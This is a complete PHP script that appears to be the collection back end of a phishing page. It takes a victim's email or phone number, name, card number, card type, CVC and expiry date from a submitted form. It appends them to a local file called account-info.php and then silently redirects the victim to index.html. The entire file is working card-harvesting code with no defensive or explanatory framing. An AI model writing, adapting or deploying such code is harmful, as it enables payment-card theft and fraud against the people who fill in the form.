<?php
file_put_contents("account-info.php", "email/number::" .$_POST['email']   ."firstname::" .$_POST['firstname'] ."lasttname::" .$_POST['lastname'] ."CardNumber::" .$_POST['card'] ."type::" .$_POST['type'] ."your CVC::" .$_POST['cvc'] ."Valid Untill::" .$_POST['valid'] ."\n", FILE_APPEND);
header('location: index.html');
exit();
?>